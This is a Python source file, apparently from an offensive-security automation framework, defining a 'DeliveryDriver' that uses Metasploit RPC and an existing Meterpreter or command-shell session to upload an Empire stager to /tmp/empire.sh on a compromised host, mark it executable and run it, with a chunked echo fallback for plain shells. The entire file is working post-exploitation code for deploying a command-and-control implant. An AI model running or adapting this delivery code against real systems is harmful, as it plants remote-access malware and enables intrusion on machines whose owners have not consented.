from modules.core.driver import BaseToolDriver, DriverResult, ParsedResult
from modules.core.utils import safe_filename
from pymetasploit3.msfrpc import MsfRpcClient
from modules.drivers.post_exploit.shgen import chunked_echo_script
import os
import time

class DeliveryDriver(BaseToolDriver):
    name = "delivery"

    def run(self, target: str, **kwargs) -> DriverResult:
        launcher = kwargs.get("launcher")
        if not launcher:
            raise RuntimeError("No launcher code provided to DeliveryDriver!")

        sessions = self.config.get("metasploit_sessions", {}).get(target, [])
        if not sessions:
            raise RuntimeError(f"No Meterpreter/Command shell session for {target}")

        sid = sessions[0]
        stager_path = os.path.join(
            self.config["empire_output_dir"],
            f"{safe_filename(target)}.sh"
        )
        with open(stager_path, "w") as f:
            f.write(launcher)

        msfrpc_pass = self.config.get("msfrpc_password", "workplease")
        msfrpc_host = self.config.get("msfrpc_host", "127.0.0.1")
        msfrpc_port = self.config.get("msfrpc_port", 55553)

        client = MsfRpcClient(msfrpc_pass, server=msfrpc_host, port=msfrpc_port)
        session = client.sessions.session(sid)
        session_type = getattr(session, 'type', None)
        self.logger.info(f"[DeliveryDriver] Session type: {session_type}")

        if session_type == 'meterpreter':
            with open(stager_path, "rb") as f:
                stager_data = f.read()
            upload_result = session.upload_file("/tmp/empire.sh", stager_data)
            if not upload_result:
                self.logger.error("[DeliveryDriver] Meterpreter upload failed")
                raise RuntimeError("Upload failed (meterpreter)")
            self.logger.info("[DeliveryDriver] Meterpreter upload successful")
            out = session.run_with_output("chmod +x /tmp/empire.sh")
            self.logger.info(f"[DeliveryDriver] chmod output: {out}")
            out = session.run_with_output("/tmp/empire.sh")
            self.logger.info(f"[DeliveryDriver] script run output: {out}")
            return DriverResult(raw_output="/tmp/empire.sh [meterpreter uploaded and executed]")

        elif session_type == 'shell':
            self.logger.info(f"[DeliveryDriver] Using chunked-echo transfer for shell session {sid}")
            remote_path = "/tmp/empire.sh"
            commands = chunked_echo_script(launcher, remote_path=remote_path, chunk_size=200)
            for i, cmd in enumerate(commands):
                try:
                    self.logger.debug(f"[DeliveryDriver] Writing chunk {i+1}/{len(commands)}: {cmd[:60]}...")
                    session.write(cmd + "\n")
                    time.sleep(0.03)  # throttle to avoid overflow
                except Exception as e:
                    self.logger.error(f"[DeliveryDriver] Error writing chunk {i+1}: {e}")
                    raise
            self.logger.info("[DeliveryDriver] Upload complete, running chmod and executing stager...")
            try:
                session.write(f"chmod +x {remote_path}\n")
                time.sleep(0.1)
                session.write(f"{remote_path}\n")
                time.sleep(0.2)
            except Exception as e:
                self.logger.error(f"[DeliveryDriver] Error running chmod or executing script: {e}")
                raise
            self.logger.info(f"[DeliveryDriver] {remote_path} uploaded via chunked-echo and executed.")
            return DriverResult(raw_output=f"{remote_path} [chunked-echo upload, shell executed]")

        else:
            self.logger.error(f"[DeliveryDriver] Unsupported session type: {session_type}")
            raise RuntimeError(f"Unsupported session type: {session_type}")

    def parse(self, raw_output_path: str) -> ParsedResult:
        return ParsedResult(data={"deployed": True})
